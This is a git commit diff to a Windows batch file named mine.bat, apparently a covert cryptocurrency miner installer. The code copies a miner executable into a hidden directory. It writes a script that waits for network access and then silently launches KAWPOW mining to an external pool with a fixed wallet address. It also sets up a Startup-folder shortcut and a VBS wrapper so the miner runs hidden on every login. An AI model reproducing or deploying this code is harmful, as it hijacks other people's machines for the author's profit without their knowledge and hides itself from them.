ca8976da67504f215b4208a7bc93d36a79ea0e6d
Tejasvi Sharma <134033214+iemtejasvi@users.noreply.github.com>
2025-02-18 11:49:34 +0530

    mine.bat

--- mine.bat
+++ mine.bat
@@ -8,18 +8,19 @@ set "MINER_SCRIPT=%INSTALL_DIR%\miner.bat"
 set "VBS_SCRIPT=%INSTALL_DIR%\run_hidden.vbs"
 set "STARTUP_SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\miner.lnk"
 
-:: Create hidden directory if not exists
+:: Ensure hidden directory exists
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
-:: Copy miner executable and script to hidden directory
-copy "%CD%\%MINER_EXE%" "%INSTALL_DIR%\%MINER_EXE%" /Y >nul 2>&1
+:: Copy miner executable to hidden location
+copy "%~dp0%MINER_EXE%" "%INSTALL_DIR%\%MINER_EXE%" /Y >nul 2>&1
 
 :: Create the miner script
 (
 echo @echo off
+echo cd /d "%INSTALL_DIR%"
 echo :loop
 echo ping -n 1 1.1.1.1 ^>nul || (timeout /t 5 >nul & goto loop)
-echo start "" /b "%INSTALL_DIR%\%MINER_EXE%" -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe
+echo start /b "%INSTALL_DIR%\%MINER_EXE%" -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe
 ) > "%MINER_SCRIPT%"
 
 :: Create a VBS script to run miner silently
